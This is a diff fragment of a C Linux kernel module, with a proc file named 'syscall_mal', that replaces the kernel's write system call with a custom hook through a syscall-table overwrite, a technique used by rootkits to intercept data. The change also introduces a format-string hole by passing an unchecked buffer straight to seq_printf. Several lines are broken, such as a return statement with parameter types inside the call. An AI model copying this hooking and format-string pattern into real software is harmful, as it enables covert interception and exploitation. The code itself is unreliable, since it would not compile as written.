@@ -32,9 +32,10 @@ char *buff;
 int buff_length;
 //Proc File variables
 const char procFile[] = "syscall_mal";
+char input[100]; // Gives
 
 static int proc_show(struct seq_file *m, void *v) {
-  seq_printf(m, "Hello proc!\n");
+  seq_printf(m, input);
   return 0;
 }
 
@@ -61,8 +62,6 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
                 return -EFAULT;
         }
         buffer[nbytes-1] = 0;
-
-        proc_input->read_proc = procfile_read(buff, NULL, 0, buff_length);
 
         return (*old_write)(int fildes, const void *buf, size_t nbytes);
 }
@@ -108,7 +107,7 @@ static void replace_syscall(ulong offset, ulong func_address)
 
 static int init_syscall(void)
 {
-        proc_create(procFile, 0, NULL,proc);
+        proc_create(procFile, 0, NULL, proc);
         replace_syscall(SYSCALL_NI, (ulong)new_write);
         return 0;
 }
